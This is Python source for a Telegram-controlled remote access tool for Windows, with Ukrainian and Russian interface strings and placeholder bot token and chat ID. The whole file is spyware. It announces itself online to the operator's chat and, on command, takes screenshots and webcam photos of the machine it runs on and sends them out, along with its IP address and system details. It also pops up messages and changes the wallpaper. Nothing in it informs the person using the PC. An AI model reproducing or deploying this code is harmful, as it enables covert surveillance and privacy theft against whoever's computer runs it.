import telebot
from telebot import types
import requests
import cv2
import ctypes
import pyautogui as pag
import platform as pf 
import os
from io import BytesIO

TOKEN = " your tokem "
CHAT_ID = " your chat id "
url = "http"
client = telebot.TeleBot(TOKEN)

requests.post(f" https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Online")

#commands list

@client.message_handler(commands=["start"])
def start(message):
    rmk = types.ReplyKeyboardMarkup(resize_keyboard = True)
    btns = ["/ip","/spec","/screenshot","/webcam","/message","/input","/wallpaper"]
    for btn in btns:
        rmk.add(types.KeyboardButton(btn))

    client.send_message(message.chat.id,"Вибери дію:",reply_markup=rmk)

#ip adress

@client.message_handler(commands=["ip","ip_address"])
def ip_address(message):
    response = requests.get("http://jsonip.com/").json()
    client.send_message(message.chat.id, f"IP Address: {response['ip']}")

#your sys specifications

@client.message_handler(commands=["spec","specifications"])
def spec(message):
    msg = f"Name Pc: {pf.node()}\nProcessor: {pf.processor()}\nSystem:{pf.system()} {pf.release()} {pf.version()}"
    client.send_message(message.chat.id, msg)

#screenshot of your screen

@client.message_handler(commands=["screenshot"])
def screenshot(message):
    pag.screenshot("000.jpg")

    with open("000.jpg","rb") as img:
        client.send_photo(message.chat.id, img)

#webcam photo

@client.message_handler(commands=["webcam"])
def webcam(message):
    cap = cv2.VideoCapture(0)

    for i in range(30):
        cap.read()
    
    ret, frame =cap.read()

    cv2.imwrite("cam.jpg", frame)
    cap.release()

    with open("cam.jpg","rb") as img:
        client.send_photo(message.chat.id, img)

#to send message to another pc

@client.message_handler(commands=["message"])
def message_sending(message):
    msg = client.send_message(message.chat.id, "Введите ваше сообщениє", )
    client.register_next_step_handler(msg, next_message_sending)

def next_message_sending(message):
    try:
        pag.alert(message.text, "~")
    except Exception:
        client.send_message(message.chat.id, "Что-то нетак смс не дошло!")

#message with answer possibility

@client.message_handler(commands=["input"])
def message_sending_with_input(message):
    msg = client.send_message(message.chat.id, "Введите ваше сообщениє", )
    client.register_next_step_handler(msg, message_sending_with_input)

def message_sending_with_input(message):
    try:
        answer = pag.prompt(message.text, "~")
        client.send_message(message.chat.id, answer)
    except Exception:
        client.send_message(message.chat.id, "Что-то нетак смс не дошло!")

#to change wallpapers

@client.message_handler(commands=["wallpaper"])
def wallpaper(message):
    msg = client.send_message(message.chat.id, "Отправьте картинку или url")
    client.register_next_step_handler(msg,next_wallpaper)

@client.message_handler(content_types=["photo","text"])
def next_wallpaper(message):
        if message.text and message.text.startswith('https://'):
            try:
                response = requests.get(message.text)
                response.raise_for_status()
                img_data = BytesIO(response.content)
                img_path = 'bg_image.jpg'

                with open(img_path, 'wb') as img_file:
                    img_file.write(img_data.getvalue())

                client.reply_to(message, "Изображение успешно установлено на рабочий стол.")

                ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(img_path), 3)

            except Exception :
                client.send_message(message.chat.id, "Ошибка!")
       
        else:
            file = message.photo[-1].file_id
            file = client.get_file(file)
            dfile = client.download_file(file.file_path)

            with open("image.jpg", "wb") as img:
                img.write(dfile)

            path = os.path.abspath("image.jpg")
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)

client.polling()